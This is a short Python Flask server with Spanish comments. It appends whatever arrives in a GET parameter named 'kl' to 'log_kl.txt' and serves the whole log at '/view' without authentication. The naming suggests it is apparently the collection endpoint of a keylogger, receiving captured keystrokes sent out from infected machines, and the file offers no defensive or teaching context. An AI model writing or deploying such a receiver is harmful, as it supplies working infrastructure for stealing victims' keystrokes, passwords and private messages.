from flask import Flask, request, jsonify
import os

app = Flask(__name__)

# Ruta al archivo de texto para almacenar los textos
archivo_texto = 'log_kl.txt'

@app.route('/', methods=['GET'])
def index():
    texto_recibido = request.args.get('kl', '')
    
    # Almacena el texto en el archivo de texto
    with open(archivo_texto, 'a') as file:
        file.write(texto_recibido + '\n')

    return "Texto almacenado correctamente en el archivo de texto.\n"
    
@app.route('/view', methods=['GET'])
def view():
    try:
        # Lee el contenido del archivo de texto
        with open(archivo_texto, 'r') as file:
            contenido = file.read()
        return contenido
    except FileNotFoundError:
        return "El archivo de texto no existe."
        
if __name__ == '__main__':
    app.run(debug=True, port=os.getenv("PORT", default=5000))

